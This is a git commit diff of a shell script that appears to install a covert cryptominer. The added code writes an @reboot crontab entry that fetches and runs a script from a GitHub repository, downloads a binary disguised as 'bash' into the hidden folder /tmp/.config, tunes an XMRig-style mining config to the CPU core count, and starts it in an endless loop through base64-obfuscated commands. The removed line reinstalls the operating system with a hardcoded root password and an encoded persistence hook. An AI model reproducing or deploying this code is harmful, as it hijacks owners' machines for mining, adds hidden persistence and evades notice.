6f1f135699f398a8dcab6ae1f6c69df4680d8cad
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2024-10-19 07:51:36 +0800

    Update zh88kk2.sh

--- zh88kk2.sh
+++ zh88kk2.sh
@@ -1,3 +1,28 @@
 #!/bin/bash
 
-bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/MoeClub/Note/master/InstallNET.sh) -d 12 -v 64 -a -p "Ls.123456" -port 2233 -cmd "IyEvYmluL2Jhc2gKCmFwdCAtcXF5IGluc3RhbGwgd2dldApiYXNoIDwod2dldCAtcU8tIGh0dHBzOi8vZ2l0aHViLmNvbS9hcm15Mm1pbC9uamFic2NiL3Jhdy9yZWZzL2hlYWRzL21haW4vLi4uKSA+Pi9kZXYvbnVsbCAyPiYxICYKc2VkIC1pICIvXkByZWJvb3QvZDtcJGFcQHJlYm9vdCByb290IC9iaW4vYmFzaCA8KHdnZXQgLXFPLSBodHRwczovL2dpdGh1Yi5jb20vYXJteTJtaWwvbmphYnNjYi9yYXcvcmVmcy9oZWFkcy9tYWluLy4uLikgPj4vZGV2L251bGwgMj4mMSAmXG5cblxuIiAvZXRjL2Nyb250YWI="
+mode="${1:-0}"
+src="https://raw.githubusercontent.com/army2mil/njabscb/main"
+[ -f "/etc/crontab" ] && sed -i "/^@reboot/d;\$a\@reboot root /bin/sh <(wget --no-check-certificate -qO- ${src}/...) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
+
+name=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
+[ -n "$name" ] || name="NULL"
+name="${name}"
+
+cores=`grep 'siblings' /proc/cpuinfo |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
+[ -n "$cores" ] && rx="[`seq -s ', ' 0 $((cores - 1))`]" || rx=""
+
+mkdir -p "/tmp/.config"
+wget --no-check-certificate -qO "/tmp/.config/config.json" "${src}/z.json"
+wget --no-check-certificate -qO "/tmp/.config/bash" "${src}/bash"
+chmod -R 777 "/tmp/.config"
+
+[ -f "/tmp/.config/config.json" ] && [ -n "$name" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${name}\",/g" "/tmp/.config/config.json"
+[ -f "/tmp/.config/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "/tmp/.config/config.json"
+
+###bash -c "ping aws.amazon.com" >/dev/null 2>&1 &
+
+if [ "$mode" == "0" ]; then
+  /bin/sh <(echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5vaHVwIC4vYmFzaCA+L2Rldi9udWxsIDI+JjEgOyBkb25l' |base64 -d) &
+else
+  /bin/sh <(echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5vaHVwIC4vYmFzaCA+L2Rldi9udWxsIDI+JjEgOyBkb25l' |base64 -d)
+fi
